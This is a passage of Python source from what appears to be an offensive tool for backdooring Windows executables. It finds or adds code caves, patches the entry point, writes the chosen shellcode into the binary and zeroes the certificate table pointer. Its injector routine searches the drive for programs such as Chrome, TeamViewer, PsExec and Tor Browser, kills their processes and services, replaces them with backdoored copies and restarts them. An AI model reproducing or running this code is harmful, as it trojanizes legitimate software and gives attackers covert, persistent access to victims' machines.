                    self.flItms['JMPtoCodeAddress'] = None
                    self.flItms['CodeCaveLOC'] = 0
                    self.flItms['cave_jumping'] = True
                    self.flItms['CavesPicked'] = {}
                    print "-resetting shells"
                    self.set_shells()
                    continue
                elif self.flItms['CavesPicked'].lower() in ['single', 's']:
                    self.flItms['JMPtoCodeAddress'] = None
                    self.flItms['CodeCaveLOC'] = 0
                    self.flItms['cave_jumping'] = False
                    self.flItms['CavesPicked'] = {}
                    print "-resetting shells"
                    self.set_shells()
                    continue
                elif self.flItms['CavesPicked'].lower() in ['ignore', 'i', 'q']:
                    #Let's say we don't want to patch a binary
                    return None
            elif self.flItms['CavesPicked'] is None:
                return None
            else:
                self.flItms['JMPtoCodeAddress'] = self.flItms['CavesPicked'].iteritems().next()[1][6]
                caves_set = True
            #else:
            #    caves_set = True

        # Assigning code caves to fix
        if self.flItms['CavesPicked'] != {}:
            for cave, values in self.flItms['CavesPicked'].iteritems():
                self.flItms['CavesToFix'][cave] = [values[6] + 5 + self.flItms['PatchLocation'], self.flItms['len_allshells'][cave]]

        #If no cave found, continue to create one.
        if self.flItms['JMPtoCodeAddress'] is None or self.flItms['NewCodeCave'] is True:
            create_cave_result = self.create_code_cave()
            if create_cave_result is False:
                return False
            self.flItms['NewCodeCave'] = True
            print "- Adding a new section to the exe/dll for shellcode injection"
        else:
            self.flItms['LastCaveAddress'] = self.flItms['CavesPicked'][len(self.flItms['CavesPicked']) - 1][6]

        #Patch the entry point
        targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
        targetFile.patch_initial_instructions()

        # recalling resumeExe
        if self.flItms['Magic'] == int('20B', 16):
            ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_64()
        else:
            ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_32()

        # setting the final shellcode
        self.set_shells()

        if self.flItms['cave_jumping'] is True:
            if self.flItms['stager'] is False:
                temp_jmp = "\xe9"
                breakupvar = eat_code_caves(self.flItms, 1, 2)
                test_length = int(self.flItms['CavesPicked'][2][1], 16) - int(self.flItms['CavesPicked'][1][1], 16) - len(self.flItms['allshells'][1]) - 5
                if test_length < 0:
                    temp_jmp += struct.pack("<I", 0xffffffff - abs(breakupvar - len(self.flItms['allshells'][1]) - 4))
                else:
                    temp_jmp += struct.pack("<I", breakupvar - len(self.flItms['allshells'][1]) - 5)
            self.flItms['allshells'] += (self.flItms['resumeExe'], )

        self.flItms['completeShellcode'] = self.flItms['shellcode'] + self.flItms['resumeExe']
        if self.flItms['NewCodeCave'] is True:
            self.binary.seek(self.flItms['newSectionPointerToRawData'] + self.flItms['buffer'])
            self.binary.write(self.flItms['completeShellcode'])
        if self.flItms['cave_jumping'] is True:
            for i, item in self.flItms['CavesPicked'].iteritems():
                self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16), 0)
                self.binary.write(self.flItms['allshells'][i])
                #So we can jump to our resumeExe shellcode
                if i == (len(self.flItms['CavesPicked']) - 2) and self.flItms['stager'] is False:
                    self.binary.write(temp_jmp)
        else:
            for i, item in self.flItms['CavesPicked'].iteritems():
                if i == 0:
                    self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16))
                    self.binary.write(self.flItms['completeShellcode'])

        #Patch certTable
        if self.ZERO_CERT is True and self.flItms['CertificateTable'] != 0:
            print "[*] Overwriting certificate table pointer"
            self.binary.seek(self.flItms['CertTableLOC'], 0)
            self.binary.write("\x00\x00\x00\x00\x00\x00\x00\x00")

        self.binary.close()

        if self.VERBOSE is True:
            self.print_flItms(self.flItms)

        return True

    def output_options(self):
        """
        Output file check.
        """
        if not self.OUTPUT:
            self.OUTPUT = os.path.basename(self.FILE)

    def check_shells(self):
        """
        checks shellcode selection
        """

        avail_shells = []

        #it's time to use a python properties TODO
        ignores = ["returnshellcode", "pack_ip_addresses",
                   "eat_code_caves", "ones_compliment",
                   "ones_compliment", "resume_execution"
                   "returnshellcode", "clean_caves_stub"
                   ]

        if self.flItms['Magic'] == int('10B', 16):
            self.flItms['bintype'] = winI32_shellcode
        if self.flItms['Magic'] == int('20B', 16):
            self.flItms['bintype'] = winI64_shellcode
        if not self.SHELL:
            print "You must choose a backdoor to add: (use -s)"
            for item in dir(self.flItms['bintype']):
                if "__" in item:
                    continue
                elif item in ignores:
                    continue
                else:
                    print "   {0}".format(item)
            return False

        if self.SHELL not in dir(self.flItms['bintype']):
            print "The following %ss are available: (use -s)" % str(self.flItms['bintype']).split(".")[1]
            for item in dir(self.flItms['bintype']):
                #print item
                if "__" in item:
                    continue
                elif item in ignores:
                    continue
                else:
                    print "   {0}".format(item)
                    avail_shells.append(item)
            self.flItms['avail_shells'] = avail_shells
            return False

        getattr(self.flItms['bintype']("127.0.0.1", 8080, self.SUPPLIED_SHELLCODE), self.SHELL)(self.flItms, self.flItms['CavesPicked'])

    def set_shells(self):
        """
        This function sets the shellcode.
        """
        print "[*] Looking for and setting selected shellcode"

        if self.check_shells() is False:
            return False
        #else:
        #    shell_cmd = self.SHELL + "()"
        self.flItms['shells'] = self.flItms['bintype'](self.HOST, self.PORT, self.SUPPLIED_SHELLCODE)
        self.flItms['allshells'] = getattr(self.flItms['shells'], self.SHELL)(self.flItms, self.flItms['CavesPicked'])
        self.flItms['shellcode'] = self.flItms['shells'].returnshellcode()
        return True

    #  TODO: Take this out and make it a standalone script
    def injector(self):
        """
        The injector module will hunt and injection shellcode into
        targets that are in the list_of_targets dict.
        Data format DICT: {process_name_to_backdoor :
                           [('dependencies to kill', ),
                           'service to kill', restart=True/False],
                           }
        """

        list_of_targets = {'chrome.exe':
                           [('chrome.exe', ), None, True], 'hamachi-2.exe':
                           [('hamachi-2.exe', ), "Hamachi2Svc", True],
                           'tcpview.exe': [('tcpview.exe',), None, True],
                           #'rpcapd.exe':
                           #[('rpcapd.exe'), None, False],
                           'psexec.exe':
                           [('psexec.exe',), 'PSEXESVC.exe', False],
                           'vncserver.exe':
                           [('vncserver.exe', ), 'vncserver', True],
                           # must append code cave for vmtoolsd.exe

                           'vmtoolsd.exe':
                           [('vmtools.exe', 'vmtoolsd.exe'), 'VMTools', True],

                           'nc.exe': [('nc.exe', ), None, False],

                           'Start Tor Browser.exe':
                           [('Start Tor Browser.exe', ), None, False],

                           'procexp.exe': [('procexp.exe',
                                            'procexp64.exe'), None, True],

                           'procmon.exe': [('procmon.exe',
                                            'procmon64.exe'), None, True],

                           'TeamViewer.exe': [('tv_x64.exe',
                                               'tv_x32.exe'), None, True]
                           }

        print "[*] Beginning injector module"
        os_name = os.name
        if os_name == 'nt':
            if "PROGRAMFILES(x86)" in os.environ:
                print "-You have a 64 bit system"
                system_type = 64
            else:
                print "-You have a 32 bit system"
                system_type = 32
        else:
            print "This works only on windows. :("
            sys.exit()
        winversion = platform.version()
        rootdir = os.path.splitdrive(sys.executable)[0]
        #print rootdir
        targetdirs = []
        excludedirs = []
        #print system_info
        winXP2003x86targetdirs = [rootdir + '\\']
        winXP2003x86excludedirs = [rootdir + '\\Windows\\',
                                   rootdir + '\\RECYCLER\\',
                                   '\\VMWareDnD\\']
        vista7win82012x64targetdirs = [rootdir + '\\']
        vista7win82012x64excludedirs = [rootdir + '\\Windows\\',
                                        rootdir + '\\RECYCLER\\',
                                        '\\VMwareDnD\\']

        #need win2003, win2008, win8
        if "5.0." in winversion:
            print "-OS is 2000"
            targetdirs = targetdirs + winXP2003x86targetdirs
            excludedirs = excludedirs + winXP2003x86excludedirs
        elif "5.1." in winversion:
            print "-OS is XP"
            if system_type == 64:
                targetdirs.append(rootdir + '\\Program Files (x86)\\')
                excludedirs.append(vista7win82012x64excludedirs)
            else:
                targetdirs = targetdirs + winXP2003x86targetdirs
                excludedirs = excludedirs + winXP2003x86excludedirs
        elif "5.2." in winversion:
            print "-OS is 2003"
            if system_type == 64:
                targetdirs.append(rootdir + '\\Program Files (x86)\\')
                excludedirs.append(vista7win82012x64excludedirs)
            else:
                targetdirs = targetdirs + winXP2003x86targetdirs
                excludedirs = excludedirs + winXP2003x86excludedirs
        elif "6.0." in winversion:
            print "-OS is Vista/2008"
            if system_type == 64:
                targetdirs = targetdirs + vista7win82012x64targetdirs
                excludedirs = excludedirs + vista7win82012x64excludedirs
            else:
                targetdirs.append(rootdir + '\\Program Files\\')
                excludedirs.append(rootdir + '\\Windows\\')
        elif "6.1." in winversion:
            print "-OS is Win7/2008"
            if system_type == 64:
                targetdirs = targetdirs + vista7win82012x64targetdirs
                excludedirs = excludedirs + vista7win82012x64excludedirs
            else:
                targetdirs.append(rootdir + '\\Program Files\\')
                excludedirs.append(rootdir + '\\Windows\\')
        elif "6.2." in winversion:
            print "-OS is Win8/2012"
            targetdirs = targetdirs + vista7win82012x64targetdirs
            excludedirs = excludedirs + vista7win82012x64excludedirs

        filelist = set()

        exclude = False
        for path in targetdirs:
            for root, subFolders, files in os.walk(path):
                for directory in excludedirs:
                    if directory.lower() in root.lower():
                        #print directory.lower(), root.lower()
                        #print "Path not allowed", root
                        exclude = True
                        #print exclude
                        break
                if exclude is False:
                    for _file in files:
                        f = os.path.join(root, _file)
                        for target, items in list_of_targets.iteritems():
                            if target.lower() == _file.lower():
                                #print target, f
                                print "-- Found the following file:", root + '\\' + _file
                                filelist.add(f)
                                #print exclude
                exclude = False

        #grab tasklist
        process_list = []
        all_process = os.popen("tasklist.exe")
        ap = all_process.readlines()
        all_process.close()
        ap.pop(0)   # remove blank line
        ap.pop(0)   # remove header line
        ap.pop(0)   # remove this ->> =======

        for process in ap:
            process_list.append(process.split())

        #print process_list
        #print filelist
        for target in filelist:
            service_target = False
            running_proc = False
            #get filename
            #support_result = support_check(target, 0)
            #if support_result is False:
            #   continue
            filename = os.path.basename(target)
            for process in process_list:
                #print process
                for setprocess, items in list_of_targets.iteritems():
                    if setprocess.lower() in target.lower():
                        #print setprocess, process
                        for item in items[0]:
                            if item.lower() in [x.lower() for x in process]:
                                print "- Killing process:", item
                                try:
                                    #print process[1]
                                    os.system("taskkill /F /PID %i" %
                                              int(process[1]))
                                    running_proc = True
                                except Exception as e:
                                    print str(e)
                        if setprocess.lower() in [x.lower() for x in process]:
                            #print True, items[0], items[1]
                            if items[1] is not None:
                                print "- Killing Service:", items[1]
                                try:
                                    os.system('net stop %s' % items[1])
                                except Exception as e:
                                    print str(e)
                                service_target = True

            time.sleep(1)
            #backdoor the targets here:
            print "*" * 50
            self.FILE = target
            self.OUTPUT = os.path.basename(self.FILE + '.bd')
            print "self.OUTPUT", self.OUTPUT
            print "- Backdooring:", self.FILE
            result = self.patch_pe()
            if result:
                pass
            else:
                continue
            shutil.copy2(self.FILE, self.FILE + self.SUFFIX)
            os.chmod(self.FILE, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
            time.sleep(1)
            try:
                os.unlink(self.FILE)
            except:
                print "unlinking error"
            time.sleep(.5)
            try:
                shutil.copy2(self.OUTPUT, self.FILE)
            except:
                os.system('move {0} {1}'.format(self.FILE, self.OUTPUT))
            time.sleep(.5)
            os.remove(self.OUTPUT)
            print (" - The original file {0} has been renamed to {1}".format(self.FILE,
                   self.FILE + self.SUFFIX))

            if self.DELETE_ORIGINAL is True:
                print "!!Warning Deleteing Original File!!"
                os.remove(self.FILE + self.SUFFIX)

            if service_target is True:
                #print "items[1]:", list_of_targets[filename][1]
                os.system('net start %s' % list_of_targets[filename][1])
            else:
                try:
                    if (list_of_targets[filename][2] is True and
                       running_proc is True):
                        subprocess.Popen([self.FILE, ])
                        print "- Restarting:", self.FILE
                    else:
                        print "-- %s was not found online -  not restarting" % self.FILE

                except:
                    if (list_of_targets[filename.lower()][2] is True and
                       running_proc is True):
                        subprocess.Popen([self.FILE, ])
                        print "- Restarting:", self.FILE
                    else:
                        print "-- %s was not found online -  not restarting" % self.FILE
